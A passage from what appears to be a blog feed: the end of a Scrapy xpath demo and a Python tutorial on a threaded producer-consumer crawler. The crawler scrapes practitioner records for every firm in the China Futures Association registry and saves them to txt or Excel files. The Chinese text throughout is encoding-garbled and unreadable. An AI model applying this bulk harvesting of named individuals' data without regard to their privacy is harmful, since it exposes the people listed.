In [5]: response.xpath(&#39;//a/text()&#39;)
Out[5]:
[&lt;Selector xpath=&#39;//a/text()&#39; data=&#39;æ·»åŠ é‡‡é›†&#39;&gt;,
 &lt;Selector xpath=&#39;//a/text()&#39; data=&#39;æ·»åŠ ç”»æ¿&#39;&gt;,
 &lt;Selector xpath=&#39;//a/text()&#39; data=&#39;å®‰è£…é‡‡é›†å·¥å…·&#39;&gt;,
 &lt;Selector xpath=&#39;//a/text()&#39; data=&#39; &#39;&gt;,
 &lt;Selector xpath=&#39;//a/text()&#39; data=&#39; &#39;&gt;]

In [6]: response.xpath(&#39;//a/text()&#39;).extract()
Out[6]: [&#39;æ·»åŠ é‡‡é›†&#39;, &#39;æ·»åŠ ç”»æ¿&#39;, &#39;å®‰è£…é‡‡é›†å·¥å…·&#39;, &#39; &#39;, &#39; &#39;]

In [7]: response.xpath(&#39;//a/text()&#39;).extract_first()
Out[7]: &#39;æ·»åŠ é‡‡é›†&#39;
</code></pre>
]]></content>
      
        <categories>
            
            <category> Python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> spider </tag>
            
            <tag> scrapy </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Pythonç½‘ç»œçˆ¬è™«3 - ç”Ÿäº§è€…æ¶ˆè´¹è€…æ¨¡å‹çˆ¬å–æŸé‡‘èç½‘ç«™æ•°æ®]]></title>
      <url>https://www.litreily.top/2018/04/30/cfachina/</url>
      <content type="html"><![CDATA[<p>åº”ä¸€ä½é‡‘èåœˆçš„æœ‹å‹æ‰€æ‰˜ï¼Œå¸®å¿™å†™ä¸ªçˆ¬è™«ï¼Œå¸®ä»–çˆ¬å–<a href="http://www.cfachina.org/cfainfo/organbaseinfoServlet?all=personinfo#" target="_blank" rel="noopener">ä¸­å›½æœŸè´§è¡Œä¸šåè®®</a>ç½‘ç«™ä¸­æ‰€æœ‰é‡‘èæœºæ„çš„ä»ä¸šäººå‘˜ä¿¡æ¯ã€‚ç½‘ç«™æ•°æ®çš„è·å–æœ¬èº«æ¯”è¾ƒç®€å•ï¼Œä½†æ˜¯ä¸ºäº†å­¦ä¹ ä¸€äº›æ–°çš„çˆ¬è™«æ–¹æ³•å’ŒæŠ€å·§ï¼Œå³æœ¬æ–‡è¦è®²è¿°çš„<strong>ç”Ÿäº§è€…æ¶ˆè´¹è€…æ¨¡å‹</strong>ï¼Œæˆ‘åˆå­¦ä¹ äº†ä¸€ä¸‹Pythonä¸­é˜Ÿåˆ—åº“<code>queue</code>åŠçº¿ç¨‹åº“<code>Thread</code>çš„ä½¿ç”¨æ–¹æ³•ã€‚</p>
<h2 id="ç”Ÿäº§è€…æ¶ˆè´¹è€…æ¨¡å‹"><a href="#ç”Ÿäº§è€…æ¶ˆè´¹è€…æ¨¡å‹" class="headerlink" title="ç”Ÿäº§è€…æ¶ˆè´¹è€…æ¨¡å‹"></a>ç”Ÿäº§è€…æ¶ˆè´¹è€…æ¨¡å‹</h2><p>ç”Ÿäº§è€…æ¶ˆè´¹è€…æ¨¡å‹éå¸¸ç®€å•ï¼Œç›¸ä¿¡å¤§éƒ¨åˆ†ç¨‹åºå‘˜éƒ½çŸ¥é“ï¼Œå°±æ˜¯ä¸€æ–¹ä½œä¸ºç”Ÿäº§è€…ä¸æ–­æä¾›èµ„æºï¼Œå¦ä¸€æ–¹ä½œä¸ºæ¶ˆè´¹è€…ä¸æ–­æ¶ˆè´¹èµ„æºã€‚ç®€å•ç‚¹è¯´ï¼Œå°±å¥½æ¯”é¤é¦†çš„å¨å¸ˆå’Œé¡¾å®¢ï¼Œå¨å¸ˆä½œä¸ºç”Ÿäº§è€…ä¸æ–­åˆ¶ä½œç¾å‘³çš„é£Ÿç‰©ï¼Œè€Œé¡¾å®¢ä½œä¸ºæ¶ˆè´¹è€…ä¸æ–­é£Ÿç”¨å¨å¸ˆæä¾›çš„é£Ÿç‰©ã€‚æ­¤å¤–ï¼Œç”Ÿäº§è€…ä¸æ¶ˆè´¹è€…ä¹‹é—´å¯ä»¥æ˜¯ä¸€å¯¹ä¸€ã€ä¸€å¯¹å¤šã€å¤šå¯¹ä¸€å’Œå¤šå¯¹å¤šçš„å…³ç³»ã€‚</p>
<p>é‚£ä¹ˆè¿™ä¸ªæ¨¡å‹å’Œçˆ¬è™«æœ‰ä»€ä¹ˆå…³ç³»å‘¢ï¼Ÿå…¶å®ï¼Œçˆ¬è™«å¯ä»¥è®¤ä¸ºæ˜¯ä¸€ä¸ªç”Ÿäº§è€…ï¼Œå®ƒä¸æ–­ä»ç½‘ç«™çˆ¬å–æ•°æ®ï¼Œçˆ¬å–åˆ°çš„æ•°æ®å°±æ˜¯é£Ÿç‰©ï¼›è€Œæ‰€å¾—æ•°æ®éœ€è¦æ¶ˆè´¹è€…è¿›è¡Œæ•°æ®æ¸…æ´—ï¼ŒæŠŠæœ‰ç”¨çš„æ•°æ®å¸æ”¶æ‰ï¼ŒæŠŠæ— ç”¨çš„æ•°æ®ä¸¢å¼ƒã€‚</p>
<p>åœ¨å®è·µè¿‡ç¨‹ä¸­ï¼Œçˆ¬è™«çˆ¬å–å’Œæ•°æ®æ¸…æ´—åˆ†åˆ«å¯¹åº”ä¸€ä¸ª<code>Thread</code>ï¼Œä¸¤ä¸ªçº¿ç¨‹ä¹‹é—´é€šè¿‡é¡ºåºé˜Ÿåˆ—<code>queue</code>ä¼ é€’æ•°æ®ï¼Œæ•°æ®ä¼ é€’è¿‡ç¨‹å°±å¥½æ¯”é¤é¦†æœåŠ¡å‘˜ä»å¨æˆ¿æŠŠé£Ÿç‰©é€åˆ°é¡¾å®¢é¤æ¡Œä¸Šçš„è¿‡ç¨‹ã€‚çˆ¬å–çº¿ç¨‹è´Ÿè´£çˆ¬å–ç½‘ç«™æ•°æ®ï¼Œå¹¶å°†åŸå§‹æ•°æ®å­˜å…¥é˜Ÿåˆ—ï¼Œæ¸…æ´—çº¿ç¨‹ä»é˜Ÿåˆ—ä¸­æŒ‰å…¥é˜Ÿé¡ºåºè¯»å–åŸå§‹æ•°æ®å¹¶æå–å‡ºæœ‰æ•ˆæ•°æ®ã€‚</p>
<p>ä»¥ä¸Šä¾¿æ˜¯å¯¹ç”Ÿäº§è€…æ¶ˆè´¹è€…æ¨¡å‹çš„ç®€å•ä»‹ç»äº†ï¼Œä¸‹é¢é’ˆå¯¹æœ¬æ¬¡çˆ¬å–ä»»åŠ¡äºˆä»¥è¯¦ç»†è¯´æ˜ã€‚</p>
<h2 id="åˆ†æç«™ç‚¹"><a href="#åˆ†æç«™ç‚¹" class="headerlink" title="åˆ†æç«™ç‚¹"></a>åˆ†æç«™ç‚¹</h2><blockquote>
<p><a href="http://www.cfachina.org/cfainfo/organbaseinfoServlet?all=personinfo" target="_blank" rel="noopener">http://www.cfachina.org/cfainfo/organbaseinfoServlet?all=personinfo</a></p>
</blockquote>
<p><img src="/assets/spider/cfachina/home_page.png" alt="home page"></p>
<p>æˆ‘ä»¬è¦çˆ¬å–çš„æ•°æ®æ˜¯ä¸»é¡µæ˜¾ç¤ºçš„è¡¨æ ¼ä¸­æ‰€æœ‰æœŸè´§å…¬å¸çš„<strong>ä»ä¸šäººå‘˜ä¿¡æ¯</strong>ï¼Œæ¯ä¸ªå…¬å¸å¯¹åº”ä¸€ä¸ª<strong>æœºæ„ç¼–å·</strong>(<code>G01001~G01198</code>)ã€‚ä»ä¸Šå›¾å¯ä»¥çœ‹åˆ°æœ‰ä¸»é¡µæœ‰åˆ†é¡µï¼Œå…±8é¡µã€‚ä»¥<code>G01001</code>æ–¹æ­£ä¸­æœŸæœŸè´§å…¬å¸ä¸ºä¾‹ï¼Œç‚¹å‡»è¯¥å…¬å¸åç§°è·³è½¬è‡³å¯¹åº”ç½‘é¡µå¦‚ä¸‹:</p>
<p><img src="/assets/spider/cfachina/personinfo.png" alt="personinfo"></p>
<p>ä»ç½‘å€åŠç½‘é¡µå†…å®¹å¯ä»¥æå–å‡ºä»¥ä¸‹ä¿¡æ¯ï¼š</p>
<ol>
<li>ç½‘å€<ul>
<li><a href="http://www.cfachina.org/cfainfo/organbaseinfoOneServlet?organid=+G01001+&amp;currentPage=1&amp;pageSize=20&amp;selectType=personinfo" target="_blank" rel="noopener">http://www.cfachina.org/cfainfo/organbaseinfoOneServlet?organid=+G01001+&amp;currentPage=1&amp;pageSize=20&amp;selectType=personinfo</a><ul>
<li><code>organid</code>: æœºæ„ç¼–å·ï¼Œ<code>+G01001+</code> ~ <code>+G01198+</code></li>
<li><code>currentPage</code>: è¯¥æœºæ„ä»ä¸šäººå‘˜ä¿¡æ¯å½“å‰é¡µé¢ç¼–å·</li>
<li><code>pageSize</code>: æ¯ä¸ªé¡µé¢æ˜¾ç¤ºçš„äººå‘˜ä¸ªæ•°ï¼Œé»˜è®¤20</li>
<li><code>selectType</code>: å›ºå®šä¸º<code>personinfo</code></li>
</ul>
</li>
</ul>
</li>
<li>æœºæ„åç§°<code>mechanism_name</code>ï¼Œåœ¨æ¯é¡µè¡¨æ ¼ä¸Šæ–¹å¯ä»¥çœ‹åˆ°å½“å‰æœºæ„åç§°</li>
<li>ä»ä¸šäººå‘˜ä¿¡æ¯ï¼Œå³æ¯é¡µçš„è¡¨æ ¼å†…å®¹ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬è¦çˆ¬å–çš„å¯¹è±¡</li>
<li>è¯¥æœºæ„ä»ä¸šäººå‘˜ä¿¡æ¯æ€»é¡µæ•°<code>page_cnt</code></li>
</ol>
<p>æˆ‘ä»¬æœ€ç»ˆçˆ¬å–çš„æ•°æ®å¯ä»¥æŒ‰æœºæ„åç§°å­˜å‚¨åˆ°å¯¹åº”çš„txtæ–‡ä»¶æˆ–excelæ–‡ä»¶ä¸­ã€‚</p>
<h3 id="è·å–æœºæ„åç§°"><a href="#è·å–æœºæ„åç§°" class="headerlink" title="è·å–æœºæ„åç§°"></a>è·å–æœºæ„åç§°</h3><p><img src="/assets/spider/cfachina/gst_title.png" alt="get mechanism name"></p>
<p>è·å–åˆ°æŸæœºæ„çš„ä»»æ„ä»ä¸šä¿¡æ¯é¡µé¢åï¼Œä½¿ç”¨<code>BeautifulSoup</code>å¯å¿«é€Ÿæå–æœºæ„åç§°ã€‚</p>
<pre><code class="python">mechanism_name = soup.find(&#39;&#39;, {&#39;class&#39;:&#39;gst_title&#39;}).find_all(&#39;a&#39;)[2].get_text()
</code></pre>
<p>é‚£ä¹ˆæœ‰äººå¯èƒ½ä¼šé—®ï¼Œæ—¢ç„¶ä¸»é¡µè¡¨æ ¼éƒ½å·²ç»åŒ…å«äº†æ‰€æœ‰æœºæ„çš„ç¼–å·å’Œåç§°ï¼Œä¸ºä½•è¿˜è¦å¤šæ­¤ä¸€ä¸¾çš„å†è·å–ä¸€æ¬¡å‘¢ï¼Ÿè¿™æ˜¯å› ä¸ºï¼Œæˆ‘å‹æ ¹å°±ä¸æƒ³çˆ¬ä¸»é¡µçš„é‚£äº›è¡¨æ ¼ï¼Œç›´æ¥æ ¹æ®æœºæ„ç¼–å·çš„é€’å¢è§„å¾‹ç”Ÿæˆå¯¹åº”çš„ç½‘å€å³å¯ï¼Œæ‰€ä»¥è·å–æœºæ„åç§°çš„ä»»åŠ¡å°±æ”¾åœ¨äº†çˆ¬å–æ¯ä¸ªæœºæ„é¦–ä¸ªä¿¡æ¯é¡µé¢ä¹‹åã€‚</p>
<h3 id="è·å–æœºæ„ä¿¡æ¯å¯¹åº”çš„ç½‘é¡µæ•°é‡"><a href="#è·å–æœºæ„ä¿¡æ¯å¯¹åº”çš„ç½‘é¡µæ•°é‡" class="headerlink" title="è·å–æœºæ„ä¿¡æ¯å¯¹åº”çš„ç½‘é¡µæ•°é‡"></a>è·å–æœºæ„ä¿¡æ¯å¯¹åº”çš„ç½‘é¡µæ•°é‡</h3><p><img src="/assets/spider/cfachina/page_cnt.png" alt="get count of page"></p>
<p>æ¯ä¸ªæœºæ„çš„æ•°æ®é‡æ˜¯ä¸ç­‰çš„ï¼Œå¹¸å¥½æ¯ä¸ªé¡µé¢éƒ½åŒ…å«äº†å½“å‰é¡µé¢æ•°åŠæ€»é¡µé¢æ•°ã€‚ä½¿ç”¨ä»¥ä¸‹ä»£ç å³å¯è·å–é¡µç æ•°ã€‚</p>
<pre><code class="python">url_re = re.compile(&#39;#currentPage.*\+.*\+\&#39;(\d+)\&#39;&#39;)
page_cnt = url_re.search(html).group(1)
</code></pre>
<p>ä»æ¯ä¸ªæœºæ„é¦–é¡µè·å–é¡µç æ•°åï¼Œä¾¿å¯<code>for</code>å¾ªç¯ä¿®æ”¹ç½‘å€å‚æ•°ä¸­çš„<code>currentPage</code>ï¼Œé€é¡µè·å–æœºæ„ä¿¡æ¯ã€‚</p>
<h3 id="è·å–å½“å‰é¡µé¢ä»ä¸šäººå‘˜ä¿¡æ¯"><a href="#è·å–å½“å‰é¡µé¢ä»ä¸šäººå‘˜ä¿¡æ¯" class="headerlink" title="è·å–å½“å‰é¡µé¢ä»ä¸šäººå‘˜ä¿¡æ¯"></a>è·å–å½“å‰é¡µé¢ä»ä¸šäººå‘˜ä¿¡æ¯</h3><p><img src="/assets/spider/cfachina/personinfo_table.png" alt="get personinfo"></p>
<p>é’ˆå¯¹å¦‚ä¸Šå›¾æ‰€ç¤ºçš„ä¸€ä¸ªç‰¹å®šä¿¡æ¯é¡µæ—¶ï¼Œäººå‘˜ä¿¡æ¯è¢«å­˜æ”¾äºä¸€ä¸ªè¡¨ä¸­ï¼Œé™¤äº†å›ºå®šçš„è¡¨å¤´ä¿¡æ¯å¤–ï¼Œäººå‘˜ä¿¡æ¯å‡è¢«åŒ…å«åœ¨ä¸€ä¸ªå¸¦æœ‰<code>id</code>çš„<code>tr</code>æ ‡ç­¾ä¸­ï¼Œæ‰€ä»¥ä½¿ç”¨<code>BeautifulSoup</code>å¯ä»¥å¾ˆå®¹æ˜“æå–å‡ºé¡µé¢å†…æ‰€æœ‰äººå‘˜ä¿¡æ¯ã€‚</p>
<pre><code class="python">soup.find_all(&#39;tr&#39;, id=True)
</code></pre>
<h2 id="ç¡®å®šçˆ¬å–æ–¹æ¡ˆ"><a href="#ç¡®å®šçˆ¬å–æ–¹æ¡ˆ" class="headerlink" title="ç¡®å®šçˆ¬å–æ–¹æ¡ˆ"></a>ç¡®å®šçˆ¬å–æ–¹æ¡ˆ</h2><p>ä¸€èˆ¬çš„æƒ³æ³•å½“ç„¶æ˜¯é€é¡µçˆ¬å–ä¸»é¡µä¿¡æ¯ï¼Œç„¶åè·å–æ¯é¡µæ‰€æœ‰æœºæ„å¯¹åº”çš„ç½‘é¡µé“¾æ¥ï¼Œè¿›è€Œç»§ç»­çˆ¬å–æ¯ä¸ªæœºæ„ä¿¡æ¯ã€‚</p>
<p>ä½†æ˜¯ç”±äºè¯¥ç½‘ç«™çš„æœºæ„ä¿¡æ¯ç½‘å€å…·æœ‰æ˜æ˜¾çš„è§„å¾‹ï¼Œæˆ‘ä»¬æ ¹æ®æ¯ä¸ªæœºæ„çš„ç¼–å·ä¾¿å¯ç›´æ¥å¾—åˆ°æ¯ä¸ªæœºæ„æ¯ä¸ªä¿¡æ¯é¡µé¢çš„ç½‘å€ã€‚æ‰€ä»¥å…·ä½“çˆ¬å–æ–¹æ¡ˆå¦‚ä¸‹ï¼š</p>
<ol>
<li>å°†æ‰€æœ‰<strong>æœºæ„ç¼–å·</strong>ç½‘å€å­˜å…¥é˜Ÿåˆ—<code>url_queue</code></li>
<li>æ–°å»ºç”Ÿäº§è€…çº¿ç¨‹<code>SpiderThread</code>å®ŒæˆæŠ“å–ä»»åŠ¡<ul>
<li>å¾ªç¯ä»é˜Ÿåˆ—<code>url_queue</code>ä¸­è¯»å–ä¸€ä¸ªç¼–å·ï¼Œç”Ÿæˆæœºæ„é¦–é¡µç½‘å€ï¼Œä½¿ç”¨<code>requests</code>æŠ“å–ä¹‹</li>
<li>ä»æŠ“å–ç»“æœä¸­è·å–é¡µç æ•°é‡ï¼Œè‹¥ä¸º0ï¼Œåˆ™è¿”å›è¯¥çº¿ç¨‹ç¬¬1æ­¥</li>
<li>å¾ªç¯çˆ¬å–å½“å‰æœºæ„å‰©ä½™é¡µé¢</li>
<li>å°†é¡µé¢ä¿¡æ¯å­˜å…¥é˜Ÿåˆ—<code>html_queue</code></li>
</ul>
</li>
<li>æ–°å»ºæ¶ˆè´¹è€…çº¿ç¨‹<code>DatamineThread</code>å®Œæˆæ•°æ®æ¸…æ´—ä»»åŠ¡<ul>
<li>å¾ªç¯ä»é˜Ÿåˆ—<code>html_queue</code>ä¸­è¯»å–ä¸€ç»„é¡µé¢ä¿¡æ¯</li>
<li>ä½¿ç”¨<code>BeautifulSoup</code>æå–é¡µé¢ä¸­çš„ä»ä¸šäººå‘˜ä¿¡æ¯</li>
<li>å°†ä¿¡æ¯ä»¥äºŒç»´æ•°ç»„å½¢å¼å­˜å‚¨ï¼Œæœ€åäº¤ç”±æ•°æ®å­˜å‚¨ç±»<code>Storage</code>å­˜å…¥æœ¬åœ°æ–‡ä»¶</li>
</ul>
</li>
</ol>
<h2 id="ä»£ç å®ç°"><a href="#ä»£ç å®ç°" class="headerlink" title="ä»£ç å®ç°"></a>ä»£ç å®ç°</h2><h3 id="ç”Ÿæˆè€…SpiderThread"><a href="#ç”Ÿæˆè€…SpiderThread" class="headerlink" title="ç”Ÿæˆè€…SpiderThread"></a>ç”Ÿæˆè€…<code>SpiderThread</code></h3><p>çˆ¬è™«çº¿ç¨‹å…ˆä»é˜Ÿåˆ—è·å–ä¸€ä¸ªæœºæ„ç¼–å·ï¼Œç”Ÿæˆæœºæ„é¦–é¡µç½‘å€å¹¶è¿›è¡Œçˆ¬å–ï¼Œæ¥ç€åˆ¤æ–­æœºæ„é¡µé¢æ•°é‡æ˜¯å¦ä¸º0ï¼Œå¦‚è‹¥ä¸ä¸º0åˆ™ç»§ç»­è·å–æœºæ„åç§°ï¼Œå¹¶æ ¹æ®é¡µé¢æ•°å¾ªç¯çˆ¬å–å‰©ä½™é¡µé¢ï¼Œå°†åŸå§‹htmlæ•°æ®ä»¥å¦‚ä¸‹<code>dict</code>æ ¼å¼å­˜å…¥é˜Ÿåˆ—<code>html_queue</code>:</p>
<pre><code class="json">{
    &#39;name&#39;: mechanismId_mechanismName,
    &#39;num&#39;: currentPage,
    &#39;content&#39;: html
}
</code></pre>
<p>çˆ¬è™«äº§ç”Ÿçš„æ•°æ®é˜Ÿåˆ—<code>html_queue</code>å°†ç”±æ•°æ®æ¸…æ´—çº¿ç¨‹è¿›è¡Œå¤„ç†ï¼Œä¸‹é¢æ˜¯çˆ¬è™«çº¿ç¨‹çš„ä¸»ç¨‹åºï¼Œæ•´ä¸ªçº¿ç¨‹ä»£ç è¯·çœ‹åé¢çš„<a href="#æºç ">æºç </a>ã€‚</p>
<pre><code class="python">def run(self):
    while True:
        mechanism_id = &#39;G0&#39; + self.url_queue.get()

        # the first page&#39;s url
        url = self.__get_url(mechanism_id, 1)
        html = self.grab(url)

        page_cnt = self.url_re.search(html.text).group(1)
        if page_cnt == &#39;0&#39;:
            self.url_queue.task_done()
            continue

        soup = BeautifulSoup(html.text, &#39;html.parser&#39;)
        mechanism_name = soup.find(&#39;&#39;, {&#39;class&#39;:&#39;gst_title&#39;}).find_all(&#39;a&#39;)[2].get_text()
        print(&#39;\nGrab Thread: get %s - %s with %s pages\n&#39; % (mechanism_id, mechanism_name, page_cnt))

        # put data into html_queue
        self.html_queue.put({&#39;name&#39;:&#39;%s_%s&#39; % (mechanism_id, mechanism_name), &#39;num&#39;:1, &#39;content&#39;:html})
        for i in range(2, int(page_cnt) + 1):
            url = self.__get_url(mechanism_id, i)
            html = self.grab(url)
            self.html_queue.put({&#39;name&#39;:&#39;%s_%s&#39; % (mechanism_id, mechanism_name), &#39;num&#39;:i, &#39;content&#39;:html})

        self.url_queue.task_done()
</code></pre>
<h3 id="æ¶ˆè´¹è€…DatamineThread"><a href="#æ¶ˆè´¹è€…DatamineThread" class="headerlink" title="æ¶ˆè´¹è€…DatamineThread"></a>æ¶ˆè´¹è€…<code>DatamineThread</code></h3><p>æ•°æ®æ¸…æ´—çº¿ç¨‹æ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯ä»ç”Ÿäº§è€…æä¾›çš„æ•°æ®é˜Ÿåˆ—<code>html_queue</code>é€ä¸€æå–<code>html</code>æ•°æ®ï¼Œç„¶åä»<code>html</code>æ•°æ®ä¸­æå–ä»ä¸šäººå‘˜ä¿¡æ¯ï¼Œä»¥äºŒç»´æ•°ç»„å½¢å¼å­˜å‚¨ï¼Œæœ€åäº¤ç”±å­˜å‚¨æ¨¡å—<code>Storage</code>å®Œæˆæ•°æ®å­˜å‚¨å·¥ä½œã€‚</p>
<pre><code class="python">class DatamineThread(Thread):
    &quot;&quot;&quot;Parse data from html&quot;&quot;&quot;
    def __init__(self, html_queue, filetype):
        Thread.__init__(self)
        self.html_queue = html_queue
        self.filetype = filetype

    def __datamine(self, data):
        &#39;&#39;&#39;Get data from html content&#39;&#39;&#39;
        soup = BeautifulSoup(data[&#39;content&#39;].text, &#39;html.parser&#39;)
        infos = []
        for info in soup.find_all(&#39;tr&#39;, id=True):
            items = []
            for item in info.find_all(&#39;td&#39;):
                items.append(item.get_text())
            infos.append(items)
        return infos

    def run(self):
        while True:
            data = self.html_queue.get()
            print(&#39;Datamine Thread: get %s_%d&#39; % (data[&#39;name&#39;], data[&#39;num&#39;]))

            store = Storage(data[&#39;name&#39;], self.filetype)
            store.save(self.__datamine(data))
            self.html_queue.task_done()
</code></pre>
<h3 id="æ•°æ®å­˜å‚¨Storage"><a href="#æ•°æ®å­˜å‚¨Storage" class="headerlink" title="æ•°æ®å­˜å‚¨Storage"></a>æ•°æ®å­˜å‚¨<code>Storage</code></h3><p>æˆ‘å†™äº†ä¸¤ç±»æ–‡ä»¶æ ¼å¼çš„å­˜å‚¨å‡½æ•°ï¼Œ<code>write_txt</code>, <code>write_excel</code>ï¼Œåˆ†åˆ«å¯¹åº”<code>txt</code>,<code>excel</code>æ–‡ä»¶ã€‚å®é™…å­˜å‚¨æ—¶ç”±è°ƒç”¨æ–¹ç¡®å®šæ–‡ä»¶æ ¼å¼ã€‚</p>
<pre><code class="python">def save(self, data):
    {
        &#39;.txt&#39;: self.write_txt,
        &#39;.xls&#39;: self.write_excel
    }.get(self.filetype)(data)
</code></pre>
<h4 id="å­˜å…¥txtæ–‡ä»¶"><a href="#å­˜å…¥txtæ–‡ä»¶" class="headerlink" title="å­˜å…¥txtæ–‡ä»¶"></a>å­˜å…¥txtæ–‡ä»¶</h4><p>å­˜å…¥<code>txt</code>æ–‡ä»¶æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œå°±æ˜¯ä»¥é™„åŠ (<code>a</code>)å½¢å¼æ‰“å¼€æ–‡ä»¶ï¼Œå†™å…¥æ•°æ®ï¼Œå…³é—­æ–‡ä»¶ã€‚å…¶ä¸­ï¼Œæ–‡ä»¶åç§°ç”±è°ƒç”¨æ–¹æä¾›ã€‚å†™å…¥æ•°æ®æ—¶ï¼Œæ¯ä¸ªäººå‘˜ä¿¡æ¯å ç”¨ä¸€è¡Œï¼Œä»¥åˆ¶è¡¨ç¬¦<code>\t</code>åˆ†éš”ã€‚</p>
<pre><code class="python">def write_txt(self, data):
    &#39;&#39;&#39;Write data to txt file&#39;&#39;&#39;
    fid = open(self.path, &#39;a&#39;, encoding=&#39;utf-8&#39;)

    # insert the header of table
    if not os.path.getsize(self.path):
        fid.write(&#39;\t&#39;.join(self.table_header) + &#39;\n&#39;)

    for info in data:
        fid.write(&#39;\t&#39;.join(info) + &#39;\n&#39;)
    fid.close()
</code></pre>
<h4 id="å­˜å…¥Excelæ–‡ä»¶"><a href="#å­˜å…¥Excelæ–‡ä»¶" class="headerlink" title="å­˜å…¥Excelæ–‡ä»¶"></a>å­˜å…¥Excelæ–‡ä»¶</h4><p>å­˜å…¥<code>Excel</code>æ–‡ä»¶è¿˜æ˜¯æ¯”è¾ƒç¹ççš„ï¼Œç”±äºç»éªŒä¸å¤šï¼Œé€‰ç”¨çš„æ˜¯<code>xlwt</code>, <code>xlrd</code>å’Œ<code>xlutils</code>åº“ã€‚è¯´å®è¯ï¼Œè¿™3ä¸ªåº“çœŸå¿ƒä¸å¤§å¥½ç”¨ï¼Œå‹‰å¼ºå®Œæˆä»»åŠ¡è€Œå·²ã€‚ä¸ºä»€ä¹ˆè¿™ä¹ˆè¯´ï¼Œä¸”çœ‹ï¼š</p>
<ol>
<li>ä¿®æ”¹æ–‡ä»¶éº»çƒ¦ï¼š<code>xlwt</code>åªèƒ½å†™,<code>xlrd</code>åªèƒ½è¯»ï¼Œéœ€è¦<code>xlutils</code>çš„<code>copy</code>å‡½æ•°å°†<code>xlrd</code>è¯»å–çš„æ•°æ®å¤åˆ¶åˆ°å†…å­˜ï¼Œå†ç”¨<code>xlwt</code>ä¿®æ”¹</li>
<li>åªæ”¯æŒ<code>.xls</code>æ–‡ä»¶ï¼š<code>.xlsx</code>ç»è¯»å†™ä¹Ÿä¼šå˜æˆ<code>.xls</code>æ ¼å¼</li>
<li>è¡¨æ ¼æ ·å¼æ˜“å˜ï¼šåªè¦é‡æ–°å†™å…¥æ–‡ä»¶ï¼Œè¡¨æ ¼æ ·å¼å¿…ç„¶é‡ç½®</li>
</ol>
<p>æ‰€ä»¥åç»­æˆ‘è‚¯å®šä¼šå†å­¦å­¦å…¶å®ƒçš„<code>excel</code>åº“ï¼Œå½“ç„¶ï¼Œå½“å‰è§£å†³æ–¹æ¡ˆæš‚æ—¶è¿˜ç”¨è¿™ä¸‰ä¸ªã€‚ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="python">def write_excel(self, data):
    &#39;&#39;&#39;write data to excel file&#39;&#39;&#39;
    if not os.path.exists(self.path):
        header_style = xlwt.easyxf(&#39;font:name æ¥·ä½“, color-index black, bold on&#39;)
        wb = xlwt.Workbook(encoding=&#39;utf-8&#39;)
        ws = wb.add_sheet(&#39;Data&#39;)

        # insert the header of table
        for i in range(len(self.table_header)):
            ws.write(0, i, self.table_header[i], header_style)
    else:
        rb = open_workbook(self.path)
        wb = copy(rb)
        ws = wb.get_sheet(0)

    # write data
    offset = len(ws.rows)
    for i in range(0, len(data)):
        for j in range(0, len(data[0])):
            ws.write(offset + i, j, data[i][j])

    # When use xlutils.copy.copy function to copy data from exist .xls file,
    # it will loss the origin style, so we need overwrite the width of column,
    # maybe there some other good solution, but I have not found yet.
    for i in range(len(self.table_header)):
        ws.col(i).width = 256 * (10, 10, 15, 20, 50, 20, 15)[i]

    # save to file
    while True:
        try:
            wb.save(self.path)
            break
        except PermissionError as e:
            print(&#39;{0} error: {1}&#39;.format(self.path, e.strerror))
            time.sleep(5)
        finally:
            pass
</code></pre>
<p>è¯´æ˜ï¼š</p>
<ol>
<li>ä¸€ä¸ªæ–‡ä»¶å¯¹åº”ä¸€ä¸ªæœºæ„çš„æ•°æ®ï¼Œéœ€è¦å¤šæ¬¡è¯»å–å’Œå†™å…¥ï¼Œæ‰€ä»¥éœ€è¦è®¡ç®—æ–‡ä»¶å†™å…¥æ—¶çš„è¡Œæ•°åç§»é‡<code>offset</code>ï¼Œå³å½“å‰æ–‡ä»¶å·²åŒ…å«æ•°æ®çš„è¡Œæ•°ï¼›</li>
<li>å½“è¢«å†™å…¥æ–‡ä»¶è¢«äººä¸ºæ‰“å¼€æ—¶ï¼Œä¼šå‡ºç°<code>PermissionError</code>å¼‚å¸¸ï¼Œå¯ä»¥åœ¨æ•è·è¯¥å¼‚å¸¸ç„¶åæç¤ºé”™è¯¯ä¿¡æ¯ï¼Œå¹¶å®šæ—¶ç­‰å¾…ç›´åˆ°æ–‡ä»¶è¢«å…³é—­ã€‚</li>
</ol>
<h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><p>ä¸»å‡½æ•°ç”¨äºåˆ›å»ºå’Œå¯åŠ¨ç”Ÿäº§è€…çº¿ç¨‹å’Œæ¶ˆè´¹è€…çº¿ç¨‹ï¼ŒåŒæ—¶ä¸ºç”Ÿäº§è€…çº¿ç¨‹æä¾›æœºæ„ç¼–å·é˜Ÿåˆ—ã€‚</p>
<pre><code class="python">url_queue = queue.Queue()
html_queue = queue.Queue()

def main():
    for i in range(1001, 1199):
        url_queue.put(str(i))

    # create and start a spider thread
    st = SpiderThread(url_queue, html_queue)
    st.setDaemon(True)
    st.start()

    # create and start a datamine thread
    dt = DatamineThread(html_queue, &#39;.xls&#39;)
    dt.setDaemon(True)
    dt.start()

    # wait on the queue until everything has been processed
    url_queue.join()
    html_queue.join()
</code></pre>
<p>ä»ä¸»å‡½æ•°å¯ä»¥çœ‹åˆ°ï¼Œä¸¤ä¸ªé˜Ÿåˆ—éƒ½è°ƒç”¨äº†<code>join</code>å‡½æ•°ï¼Œç”¨äºé˜»å¡ï¼Œç›´åˆ°å¯¹åº”é˜Ÿåˆ—ä¸ºç©ºä¸ºæ­¢ã€‚è¦æ³¨æ„çš„æ˜¯ï¼Œé˜Ÿåˆ—æ“ä½œä¸­ï¼Œ<strong>æ¯ä¸ªå‡ºé˜Ÿæ“ä½œ<code>queue.get()</code>éœ€è¦å¯¹åº”ä¸€ä¸ª<code>queue.task_done()</code>æ“ä½œ</strong>ï¼Œå¦åˆ™ä¼šå‡ºç°é˜Ÿåˆ—æ•°æ®å·²å…¨éƒ¨å¤„ç†å®Œï¼Œä½†ä¸»çº¿ç¨‹ä»åœ¨æ‰§è¡Œçš„æƒ…å†µã€‚</p>
